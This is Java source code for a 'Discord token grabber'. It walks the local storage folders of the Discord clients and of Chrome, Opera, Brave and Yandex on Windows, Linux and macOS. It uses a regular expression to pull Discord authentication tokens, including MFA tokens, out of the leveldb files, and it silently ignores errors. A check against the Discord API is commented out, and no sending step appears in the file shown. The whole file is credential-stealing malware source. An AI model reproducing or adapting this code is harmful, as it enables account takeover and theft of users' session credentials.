package discordtokengrabber;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Grabber {
	public static boolean debug = false;

	public static List<String> getTokens(boolean check_isValid) {
		List<String> tokens = new ArrayList<>();
		String fs = System.getProperty("file.separator");
		String localappdata = System.getenv("LOCALAPPDATA");
		String roaming = System.getenv("APPDATA");
		String[][] paths = { { "Discord", roaming + "\\Discord\\Local Storage\\leveldb" }, // Standard Discord
				{ "Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb" }, // Discord Canary
				{ "Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb" }, // Discord PTB
				{ "Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb" }, // Chrome Browser
				{ "Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb" }, // Opera Browser
				{ "Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb" }, // Brave Browser
				{ "Yandex Browser",
						localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb" }, // Yandex Browser
				{ "Brave Browser",System.getProperty("user.home") + fs	+ ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb" }, // Brave Browser Linux
				{ "Yandex Browser Beta",	System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb" }, // Yandex Browser Beta
																									// Linux
				{ "Yandex Browser",
						System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb" }, // Yandex Browser Linux
				{ "Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb" }, // Chrome Browser Linux
				{ "Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb" }, // Opera
																													// Browser
																													// Linux
				{ "Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb" }, // Discord
																												// Linux
				{ "Discord Canargy",
						System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb" }, // Discord
																												// Canary
																												// Linux
				{ "Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb" }, // Discord
																														// Canary
																														// Linux
				{ "Discord",
						System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb" } // Discord
																															// MacOS
		};

		for (String[] path : paths) {
			
			//System.out.println("Searching: " + path[1]);
			
			try {
				File file = new File(path[1]);

				for (String pathname : file.list()) {
					if (debug) {
						System.out.println("Searching: " + path[1] + System.getProperty("file.separator") + pathname);
					}
					FileInputStream fstream = new FileInputStream(
							path[1] + System.getProperty("file.separator") + pathname);
					DataInputStream in = new DataInputStream(fstream);
					BufferedReader br = new BufferedReader(new InputStreamReader(in));
					String strLine;
					
					
					int cx = 0;
					while ((strLine = br.readLine()) != null) {

                        Pattern p = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w\\W]{84}");
                        Matcher m = p.matcher(strLine);
                        
                        while (m.find()) {
                            
                        	if (!tokens.contains(m.group())) {
								tokens.add(m.group());
							}
                            cx++;
                        }

					}
                        
				}
			} catch (Exception ignored) {
			}
		}

		if (check_isValid) {
			if (debug) {
				System.out.println("checking if valid");
				System.out.println(tokens.toString());
			}
			if (!tokens.isEmpty()) {
				Iterator<String> iter = tokens.iterator();

				while (iter.hasNext()) {
					String str = iter.next();
					// get_request("https://discordapp.com/api/v6/users/@me", true, str);
					if (debug) {
						System.out.println("Token: " + str + " is valid");
					}
				}

				return tokens;
			} else {
				if (debug) {
					System.out.println("No tokens found\nExitting...");
					System.exit(0);
				}
				return null;
			}

		} else {
			return tokens;
		}
	}

}
